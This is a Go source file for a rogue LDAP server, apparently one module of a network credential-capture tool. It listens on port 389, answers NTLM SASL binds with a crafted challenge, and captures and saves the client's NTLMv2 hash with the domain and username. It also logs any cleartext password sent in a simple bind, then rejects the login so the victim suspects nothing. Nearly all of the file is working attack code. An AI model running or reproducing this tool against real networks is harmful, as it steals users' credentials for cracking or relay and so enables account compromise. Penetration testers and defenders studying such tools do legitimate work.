package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

func serveLDAP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:389", ifaceIP))
	if err != nil {
		logError("LDAP listen :389 — %v (need root?)", err)
		return
	}
	logInfo("LDAP listening on %s:389", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleLDAP(c)
	}
}

func handleLDAP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := getChallenge()
	var msgID int

	buf := make([]byte, 8192)
	for {
		n, err := c.Read(buf)
		if err != nil || n == 0 {
			return
		}
		pkt := buf[:n]

		// LDAP messages are BER SEQUENCE (0x30)
		if len(pkt) < 2 || pkt[0] != 0x30 {
			return
		}

		inner, ok := berInner(pkt)
		if !ok {
			return
		}

		// messageID: INTEGER (0x02)
		if len(inner) < 3 || inner[0] != 0x02 {
			return
		}
		idLen := int(inner[1])
		if idLen > 4 || 2+idLen > len(inner) {
			return
		}
		for i := 0; i < idLen; i++ {
			msgID = (msgID << 8) | int(inner[2+i])
		}
		inner = inner[2+idLen:]

		// ProtocolOp: [APPLICATION 0] = BindRequest (0x60)
		if len(inner) < 2 || inner[0] != 0x60 {
			continue
		}
		bindBody, ok := berInner(inner)
		if !ok {
			return
		}

		// version INTEGER (skip)
		if len(bindBody) < 3 || bindBody[0] != 0x02 {
			return
		}
		verLen := int(bindBody[1])
		bindBody = bindBody[2+verLen:]

		// name OCTET STRING (skip)
		if len(bindBody) < 2 || bindBody[0] != 0x04 {
			return
		}
		nameLen := int(bindBody[1])
		bindBody = bindBody[2+nameLen:]

		// authentication: [3] sasl (0xa3) or [0] simple (0x80)
		if len(bindBody) < 2 {
			return
		}
		authTag := bindBody[0]

		if authTag == 0xa3 { // SASL
			saslBody, ok := berInner(bindBody)
			if !ok {
				return
			}
			// mechanism: OCTET STRING
			if len(saslBody) < 2 || saslBody[0] != 0x04 {
				return
			}
			mechLen := int(saslBody[1])
			mech := string(saslBody[2 : 2+mechLen])
			saslBody = saslBody[2+mechLen:]

			if mech != "GSS-SPNEGO" && mech != "NTLM" && mech != "GSSAPI" {
				logVerbose("LDAP unknown SASL mechanism: %s", mech)
				return
			}

			// credentials: OCTET STRING (optional)
			if len(saslBody) < 2 || saslBody[0] != 0x04 {
				return
			}
			credLen := berReadLen(saslBody[1:])
			credOff := 1 + berLenBytes(credLen)
			if credOff+credLen > len(saslBody) {
				return
			}
			creds := saslBody[credOff : credOff+credLen]

			ntlm := FindNTLMSSP(creds)
			if len(ntlm) < 12 {
				return
			}
			msgType := binary.LittleEndian.Uint32(ntlm[8:12])

			switch msgType {
			case 1: // NTLM negotiate → send challenge
				ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
				spnego := WrapSPNEGOChallenge(ntlmChallenge)
				resp := ldapBindResponse(msgID, 14, spnego) // 14 = saslBindInProgress
				c.Write(resp)
				logVerbose("LDAP NTLM Type1 from %s — issuing challenge", c.RemoteAddr())

			case 3: // NTLM authenticate → capture
				hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
				if err != nil {
					logVerbose("LDAP NTLM parse: %v", err)
					return
				}
				logSuccess("[LDAP] NTLMv2 captured from %s", c.RemoteAddr())
				logSuccess("       %s\\%s", domain, user)
				logSuccess("       %s", hash)
				saveHash(hash)
				resp := ldapBindResponse(msgID, 49, nil) // 49 = invalidCredentials
				c.Write(resp)
				return
			}

		} else if authTag == 0x80 { // simple bind — can capture plaintext
			simpleLen := berReadLen(bindBody[1:])
			simpleOff := 1 + berLenBytes(simpleLen)
			if simpleOff+simpleLen > len(bindBody) {
				return
			}
			pass := string(bindBody[simpleOff : simpleOff+simpleLen])
			if pass != "" {
				logSuccess("[LDAP] Cleartext bind from %s: password=%q", c.RemoteAddr(), pass)
			}
			resp := ldapBindResponse(msgID, 49, nil)
			c.Write(resp)
			return
		}
	}
}

// ldapBindResponse builds a minimal LDAP BindResponse BER packet.
// resultCode: 14=saslBindInProgress, 49=invalidCredentials, 0=success
// serverSaslCreds: if non-nil, appended as [7] OPTIONAL
func ldapBindResponse(msgID int, resultCode int, serverSaslCreds []byte) []byte {
	// Build BindResponse body
	var body []byte
	body = append(body, berTag(0x0a, []byte{byte(resultCode)})...) // ENUMERATED resultCode
	body = append(body, 0x04, 0x00)                                // matchedDN ""
	body = append(body, 0x04, 0x00)                                // diagnosticMessage ""
	if serverSaslCreds != nil {
		body = append(body, berTag(0x87, serverSaslCreds)...) // [7] serverSaslCreds
	}
	bindResp := berTag(0x61, body) // [APPLICATION 1]

	var msgIDBuf [4]byte
	binary.BigEndian.PutUint32(msgIDBuf[:], uint32(msgID))
	// trim leading zeros
	msgIDBytes := msgIDBuf[:]
	for len(msgIDBytes) > 1 && msgIDBytes[0] == 0 {
		msgIDBytes = msgIDBytes[1:]
	}
	msgIDField := berTag(0x02, msgIDBytes) // INTEGER

	msg := append(msgIDField, bindResp...)
	return berTag(0x30, msg) // SEQUENCE
}

// BER helpers for LDAP

func berTag(tag byte, data []byte) []byte {
	out := []byte{tag}
	l := len(data)
	switch {
	case l < 0x80:
		out = append(out, byte(l))
	case l < 0x100:
		out = append(out, 0x81, byte(l))
	case l < 0x10000:
		out = append(out, 0x82, byte(l>>8), byte(l))
	}
	return append(out, data...)
}

// berInner returns the inner bytes of a TLV, stripping tag and length.
func berInner(data []byte) ([]byte, bool) {
	if len(data) < 2 {
		return nil, false
	}
	l := berReadLen(data[1:])
	lb := berLenBytes(l)
	if 1+lb+l > len(data) {
		return nil, false
	}
	return data[1+lb : 1+lb+l], true
}

func berReadLen(data []byte) int {
	if len(data) == 0 {
		return 0
	}
	if data[0] < 0x80 {
		return int(data[0])
	}
	n := int(data[0] & 0x7f)
	l := 0
	for i := 1; i <= n && i < len(data); i++ {
		l = (l << 8) | int(data[i])
	}
	return l
}

func berLenBytes(l int) int {
	switch {
	case l < 0x80:
		return 1
	case l < 0x100:
		return 2
	default:
		return 3
	}
}
